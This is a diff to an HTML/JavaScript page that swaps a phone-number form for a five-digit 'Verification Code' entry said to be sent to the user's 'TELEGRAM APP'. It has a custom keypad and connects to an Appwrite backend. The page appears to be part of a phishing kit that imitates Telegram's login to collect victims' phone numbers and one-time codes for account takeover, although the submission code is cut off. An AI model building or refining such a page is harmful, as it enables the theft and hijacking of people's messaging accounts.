@@ -8,15 +8,34 @@
 </head>
 <body>
     <div class="container">
-        <h2>Your phone number</h2>
-        <p>Please confirm your country code and enter your phone number.</p>
-        <form id="phone-form">
-            <div class="input-group">
-                <label for="phone-number">Phone number</label>
-                <input type="text" id="phone-number" required placeholder="+" value="+"> <!-- Prewritten + -->
+
+
+        <h2>Verification Code</h2>
+        <p>Please enter the verification code sent to your TELEGRAM APP</p>
+        <fieldset class='number-code'>
+            <div>
+              <input name='code' class='code-input' maxlength="1" required oninput="moveToNext(this, 'code-input')" />
+              <input name='code' class='code-input' maxlength="1" required oninput="moveToNext(this, 'code-input')" />
+              <input name='code' class='code-input' maxlength="1" required oninput="moveToNext(this, 'code-input')" />
+              <input name='code' class='code-input' maxlength="1" required oninput="moveToNext(this, 'code-input')" />
+              <input name='code' class='code-input' maxlength="1" required oninput="moveToNext(this, 'code-input')" />
             </div>
-            <button type="submit" class="submit-btn">&#10140;</button> <!-- Arrow icon -->
-        </form>
+        </fieldset>
+        <script>
+            function moveToNext(current, className) {
+                if (current.value.length >= current.maxLength) {
+                    let next = current.nextElementSibling;
+                    while (next && !next.classList.contains(className)) {
+                        next = next.nextElementSibling;
+                    }
+                    if (next) {
+                        next.focus();
+                    }
+                }
+            }
+        </script>
+
+        <button type="submit" class="submit-btn">Submit</button>
 
         <div class="number-keyboard">
             <div class="key-row">
@@ -53,7 +72,7 @@
             .setProject('66f1f933003cce932aea'); // Your project ID
 
         // Get references to the necessary elements
-        const phoneNumberInput = document.getElementById('phone-number');
+        const codeInputs = document.querySelectorAll('.code-input');
         const keys = document.querySelectorAll('.key');
         
         // Function to append number to the input
@@ -63,21 +82,39 @@
 
                 // Handle robber button (backspace functionality)
                 if (key.classList.contains('robber-btn')) {
-                    // Prevent removing the '+' sign
-                    if (phoneNumberInput.value.length > 1) {
-                        phoneNumberInput.value = phoneNumberInput.value.slice(0, -1); // Remove last character
+                    const currentInput = document.activeElement;
+                    if (currentInput.classList.contains('code-input') && currentInput.value.length > 0) {
+                        currentInput.value = ''; // Clear the current input
+                        currentInput.focus(); // Keep focus on the current input
+                    } else {
+                        // Move focus to the previous input if current is empty
+                        let prev = currentInput.previousElementSibling;
+                        while (prev && !prev.classList.contains('code-input')) {
+                            prev = prev.previousElementSibling;
+                        }
+                        if (prev) {
+                            prev.value = ''; // Clear the previous input
+                            prev.focus(); // Move focus to the previous input
+                        }
                     }
                 } else {
-                    // Prevent adding '+' if it's already there
-                    if (keyValue === '+' && phoneNumberInput.value.includes('+')) return;
-                    phoneNumberInput.value += keyValue; // Add key value to input
+                    // Find the first empty input and add the key value
+                    for (let input of codeInputs) {
+                        if (input.value === '') {
+                            input.value = keyValue;
+                            moveToNext(input, 'code-input');
+                            break;
+                        }
+                    }
                 }
             });
         });
 
         // Prevent keyboard from appearing
-        phoneNumberInput.addEventListener('focus', function() {
-            this.blur(); // Remove focus, which prevents the keyboard from appearing
+        codeInputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.blur(); // Remove focus, which prevents the keyboard from appearing
+            });
         });
 
         // Handle form submission
